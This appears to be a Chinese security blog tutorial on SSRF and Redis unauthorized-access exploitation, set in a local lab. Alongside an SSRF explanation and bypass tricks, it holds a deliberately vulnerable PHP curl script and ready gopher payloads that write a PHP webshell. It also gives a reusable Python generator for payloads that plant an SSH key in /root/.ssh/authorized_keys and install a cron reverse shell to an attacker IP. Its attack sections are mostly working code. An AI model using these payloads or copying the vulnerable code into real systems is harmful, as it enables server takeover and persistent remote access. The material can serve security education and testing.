---
title: SSRF-Redis未授权访问利用
description: 本文章记录SSRF的基础知识和Redis的未授权访问利用。
date: 2025-02-18
image: cover.png
categories:
    - cate1
tags:
    - SSRF
    - Redis
---

## SSRF

### 前言

​	在近期的几场比赛中，考察了SSRF的知识点，实践下来，发现我之前严重低估了SSRF的威力，所以决定写下这篇文章，简单梳理一下SSRF的漏洞原理及利用方法。

### 什么是SSRF？

​	SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）

#### SSRF漏洞原理

​	SSRF产生的原因大多是由于服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如：一个正常业务，期望用户传入的参数是这样的：https://example.com，假设服务器没有过滤file://，那么攻击者就可以利用file伪协议访问本地文件，又或者说，没有限制用户传入的参数必须包含example这个域名，实际上如果只限制了必须包含example这个域名，而不限制'..'，仍然可以利用file伪协议访问本地文件。

​	SSRF主要的攻击方式如下：

> - 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。
> - 攻击运行在内网或本地的应用程序。
> - 对内网Web应用进行指纹识别，识别企业内部的资产信息。
> - 攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。
> - 利用file协议读取本地文件等。

​	PHP中漏洞产生的相关函数：

```php
file_get_contents()
fsockopen()
curl_exec()
fopen()
readfile()
```

​	Java中漏洞产生的相关函数：

```java
client.execute()
httpclient.execute()
```

### SSRF利用

SSRF常用伪协议：

```http
##利用file协议查看本地文件
file:// 
##利用dict探测端口
dict://
##利用gopher协议反弹shell
gopher://
```

#### 漏洞案例

​	为了更方便理解SSRF，这里选择PHP来演示SSRF ，创建一个PHP文件，键入如下代码：

```php
<?php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_exec($ch);
    curl_close($ch);
}

$url = $_GET['url'];
curl($url);  
?>
```

​	访问：[http://127.0.0.1/SSRF.php?url=www.baidu.com](http://127.0.0.1/SSRF.php?url=www.baidu.com)，你将会看到如下页面：

![image-20250112161912730](/image-20250112161912730-1739451911330-1.png)

​	现在可确认这里是存在SSRF的，那么我们就可以尝试构造payload

```http
#访问本地文件
http://127.0.0.1/SSRF.php?url=file:///etc/passwd
#端口探测
http://127.0.0.1/SSRF.php?url=dict://127.0.0.1:6379
#假设存在redis未授权访问，且服务为PHP，则可用gopher写shell
http://127.0.0.1/SSRF.php?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%247%0D%0A%0A%0Acmd%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
```

​	利用SSRF探测6379端口，发现存在redis服务。

​	![image-20250112162700988](/image-20250112162700988-1739451911330-2.png)

​	后续就可以使用前面所提供的payload进行写马操作，由于我是在Windows上运行的PHP所以这里不做演示。

### SSRF常用绕过方法

　1.@　　　　　　　　　　http://abc.com@127.0.0.1

　2.添加端口号　　　　　　http://127.0.0.1:8080

　3.短地址　　　　　　　　https://0x9.me/cuGfD    推荐：http://tool.chinaz.com/tools/dwz.aspx、https://dwz.cn/

　4.可以指向任意ip的域名　 xip.io               原理是DNS解析。xip.io可以指向任意域名，即127.0.0.1.xip.io，可解析为127.0.0.1

　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制） 

　6.非HTTP协议

　7.DNS Rebinding

　8.利用[::]绕过         http://[::]:80/ >>> http://127.0.0.1

　9.句号绕过         127。0。0。1 >>> 127.0.0.1

　10.利用302跳转绕过   使用[https://tinyurl.com生成302跳转地址](https://tinyurl.xn--com302-u20k9dv69h8r7bzc7cjyd/)

@：http://www.baidu.com@10.10.10.10 与 http?/10.10.10.10 请求是相同的

#### 过滤绕过

IP地址转换成十进制：

127.0.0.1 先转换为十六进制  7F000001 两位起步所以 1就是01

7F000001转换为二进制
127.0.0.1=2130706433 最终结果

还有根据域名判断的，比如xip.io域名，就尝试如下方法

[xip.io](http://xip.io/)
[xip.io127.0.0.1.xip.io](http://xip.io127.0.0.1.xip.io/) -->127.0.0.1
[www.127.0.0.1.xip.io](http://www.127.0.0.1.xip.io/) -->127.0.0.1
[Haha.127.0.0.1.xip.io](http://haha.127.0.0.1.xip.io/) -->127.0.0.1
[Haha.xixi.127.0.0.1.xip.io](http://haha.xixi.127.0.0.1.xip.io/) -->127.0.0.1

#### 常见限制

**限制为[http://www.xxx.com](http://www.xxx.com/) 域名**

采用http基本身份认证的方式绕过。即@
`http://www.xxx.com@www.xxc.com`

**限制请求IP不为内网地址**

当不允许ip为内网地址时
（1）采取短网址绕过
（2）采取特殊域名
（3）采取进制转换

**限制请求只为http协议**

（1）采取302跳转
（2）采取短地址

### SSRF防御建议

> - 限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。
> - 限制不能访问内网的IP，以防止对内网进行攻击。
> - 屏蔽返回的详细信息。

### 总结

​	我们可以发现，SSRF的危害主要来自于本地文件的读取，以及暴露内网应用。而想要发挥SSRF最大的威力就需要搭配其他的漏洞，比如redis未授权访问或者fastcgi等扩大危害。

## Redis未授权攻击

> ​	Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源IP访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作，所以Redis可以实现如下攻击操作。

1. 如果是PHP服务器，或者支持解析JSP的Java服务器，那么就可以实现写Webshell操控服务器。
2. 如果Redis服务器存在SSH服务，Redis服务器暴露在公网，并且运行Redis服务的用户拥有root权限，那么就可以在/root/.ssh文件夹的 authotrized_keys 文件中写入自己的ssh公钥，就可以使用对应私钥直接使用ssh服务登录服务器。
3. 如果Redis服务器存在定时任务功能，那么就可以在定时任务路径中写入定时任务，执行命令行命令，就可以实现反弹shell，登陆服务器。

### 创建Redis服务

​	先运行一个Redis服务，步骤如下：

​	靶机下载redis-4.0.10

```bash
wget http://download.redis.io/releases/redis-4.0.10.tar.gz
```

​	解压，进入源码目录，然后编译(make、make install)，进入SRC目录，启动redis

```bash
tar -zxf redis-4.0.10.tar.gz   #解压
cd redis-4.0.10    #进入解压的文件夹内
make  
make install #编译
cd SRC
redis-server
```

​	查看redis服务

​	使用另一个终端，输入命令：

```bash
ps -ef | grep redis-server
```

![image-20250206122138201](/image-20250206122138201.png)

### Web服务绝对路径写入Webshell

​	这里用PHP演示，使用前面所提供过的PHP文件。这里我们重点不是Redis，所以直接演示gopher协议写入PHPWebshell。如果有兴趣可以看如下文章：[SSRF + Redis 利用方式学习笔记 - 1ndex- - 博客园](https://www.cnblogs.com/wjrblogs/p/14456190.html)

```python
import urllib
import urllib.parse
protocol="gopher://"  # 使用的协议 
ip="127.0.0.1"
port="6379"   # 目标redis的端口号 
shell="\n\n<?php system($_GET['cmd']);?>\n\n"
filename="shell.php"   # shell的名字 
path="/var/www/html"      # 写入的路径
passwd=""   # 如果有密码 则填入
# 我们的恶意命令 
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    #print(payload)
    print(urllib.parse.quote(payload))
```

​	执行后即可得到如下payload，构造如下数据包：

```http
GET /SSRF.php?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252433%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2524_GET%255B%2527cmd%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A HTTP/1.1
Host: 61.139.2.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
```

​	来到Web服务的目录下的即可看到shell已写好。

![image-20250206133410370](/image-20250206133410370.png)

### Redis写入ssh公钥

​	利用条件：Redis拥有root权限。

​	原理：通过在目标机器上写入ssh公钥，然后攻击机便可通过ssh免密码登录。

​	先在攻击机中生成ssh公/私钥。

```bash
ssh-keygen -t rsa
```

​	一直回车即可。完成后，即可查看/root/.ssh下的公私钥。查看id_rsa.pub，复制后利用如下脚本。

```python
import urllib
import urllib.parse
protocol="gopher://"  # 使用的协议 
ip="127.0.0.1"
port="6379"   # 目标redis的端口号 
shell="\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0TTQ+pRMCoRIoX4Fa2qRhIG4qd0/50Y5e69emOhKFlOVHWXuOnKvTv9Due+g0XN2sPNLTap0Ga9Ix3hPYWsYdwrw7i9afDGkGxs+bf0TshnCvSZFcPP0PCZBul4LWW4wHeQGgOD7hXA695UQVZzS/8i1czIOnuCoXqTzRTQOSvSRNzNEBuChBMYqOsLK9y+9HTwz1GrhA8Iki2+94OUm5vT7z4V44bdWXuNP11ECphpaFEc2ZIpkaQ2fuT17b2HM1XFz/oJv8K3oz6zYf6PX1BV7n/tTMJKKNdRw2cjWiYCO3eun2FRAe9kpnpqD7J4eV9C6OMfjCylGqMW1ksHO4OSuDfpr0+GPecXFQw/sOwQdTLdqQWKl3sHeWVZK5ju9AeGhTGbk/H4fNwKtTRqEf7v6V+hCU7iPGG/00arjjQ63pfDJ8t54WD4pXHknAqPgIbaQAo9PqwfY9IaZ+KOyKXCGjzvqFsDzkdqDBHeeQMaO06O1YIDoqtHzTlMlUuX0= root@player-virtual-machine\n\n"
filename="authorized_keys"   # shell的名字 
path="/root/.ssh/"      # 写入的路径
passwd=""   # 如果有密码 则填入
# 我们的恶意命令 
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    #print(payload)
    print(urllib.parse.quote(payload))
```

​	利用生成的payload，在目标机的/root/.ssh目录下写入一个authorized_keys文件，然后使用如下命令连接。

```bash
ssh -i /root/.ssh/id_rsa root@IP
```

​	![image-20250208135632966](/image-20250208135632966.png)

### 定时任务反弹shell

​	条件：

1. redis 有 root
2. Centos由于Redis 输出的文件都是 644 权限，但是 ubuntu 中的定时任务一定要600权限才能实现所以这个方法只适用于Centos

​	未授权访问写入：

```bash
flushall
set 1 "\n\n\n\n* * * * * root bash -i >& /dev/tcp/{IP}/port 0>&1\n\n\n\n"
config set dir '/var/spool/cron'
config set dbfilename root
save
```

​	修改之前给出的脚本。

```python
import urllib.parse
protocol="gopher://"
ip="127.0.0.1"
port="6379"
shell="\n\n\n\n* * * * * root bash -i >& /dev/tcp/{IP}/{port} 0>&1\n\n\n\n"
filename="root"
path="/var/spool/cron"
passwd=""
cmd=["flushall",
     "set 1 {}".format(shell.replace(" ","${IFS}")),
     "config set dir {}".format(path),
     "config set dbfilename {}".format(filename),
     "save"
     ]
if passwd:
    cmd.insert(0,"AUTH {}".format(passwd))
payload=protocol+ip+":"+port+"/_"
def redis_format(arr):
    CRLF="\r\n"
    redis_arr = arr.split(" ")
    cmd=""
    cmd+="*"+str(len(redis_arr))
    for x in redis_arr:
        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
    cmd+=CRLF
    return cmd

if __name__=="__main__":
    for x in cmd:
        payload += urllib.parse.quote(redis_format(x))
    #print(payload)
    print(urllib.parse.quote(payload))
```

## 参考文献

[SSRF漏洞原理攻击与防御(超详细总结)-CSDN博客](https://blog.csdn.net/qq_43378996/article/details/124050308)

[SSRF漏洞（原理、挖掘点、漏洞利用、修复建议） - Saint_Michael - 博客园](https://www.cnblogs.com/miruier/p/13907150.html)

[SSRF最全总结(协议,绕过)_ssrf协议-CSDN博客](https://blog.csdn.net/weixin_50464560/article/details/122473887)

[Redis未授权访问及利用复现（保姆级教程）_主从复制漏洞影响版本-CSDN博客](https://blog.csdn.net/qq_34341458/article/details/119771942)
